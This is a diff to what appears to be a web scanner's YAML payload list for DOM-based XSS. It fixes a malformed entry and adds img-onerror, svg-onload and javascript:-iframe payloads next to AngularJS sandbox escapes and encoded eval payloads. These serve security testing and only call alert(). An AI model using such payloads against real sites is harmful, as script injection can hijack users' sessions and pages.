@@ -300,7 +300,6 @@ dom_xss:
     - "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(\"DOMXSS\"),a')}}"
     - "{{$eval.constructor('alert(\"DOMXSS\")')()}}"
     - 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=''+/"/+/onmouseover=1/+/[*/[]/+alert(''DOMXSS'')//''>'
-    - - 'javascript:alert(1)'
     - 'javascript://%250Aalert(1)'
     - 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
     - 'eval(atob("YWxlcnQoMSk="))'
@@ -312,6 +311,10 @@ dom_xss:
     - '{{constructor.constructor("alert(1)")()}}'
     - '{{$on.constructor("alert(1)")()}}'
     - '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}'
+    - '<img src=x onerror=alert(1)>'
+    - '"><svg/onload=alert(1)>'
+    - '<iframe src="javascript:alert(`XSS`)">'
+
 
 
 # XML External Entity Tester
